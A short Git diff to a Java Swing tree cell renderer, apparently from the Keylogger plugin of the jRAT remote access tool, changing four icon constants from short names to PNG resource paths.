@@ -13,10 +13,10 @@ import jrat.api.Icons;
 @SuppressWarnings({ "serial", "deprecation" })
 public class TreeRenderer extends DefaultTreeCellRenderer {
 	
-	public static final Icon DAY_ICON = Icons.getIcon("Keylogger", "day");
-	public static final Icon MONTH_ICON = Icons.getIcon("Keylogger", "month");
-	public static final Icon YEAR_ICON = Icons.getIcon("Keylogger", "year");
-	public static final Icon DEFAULT_ICON = Icons.getIcon("Keylogger", "default");
+	public static final Icon DAY_ICON = Icons.getIcon("Keylogger", "/icons/day.png");
+	public static final Icon MONTH_ICON = Icons.getIcon("Keylogger", "/icons/month.png");
+	public static final Icon YEAR_ICON = Icons.getIcon("Keylogger", "/icons/year.png");
+	public static final Icon DEFAULT_ICON = Icons.getIcon("Keylogger", "/icons/default.png");
 
 	public Component getTreeCellRendererComponent(JTree tree, Object value, boolean sel, boolean expanded, boolean leaf, int row, boolean hasFocus) {
 		super.getTreeCellRendererComponent(tree, value, sel, expanded, leaf, row, hasFocus);
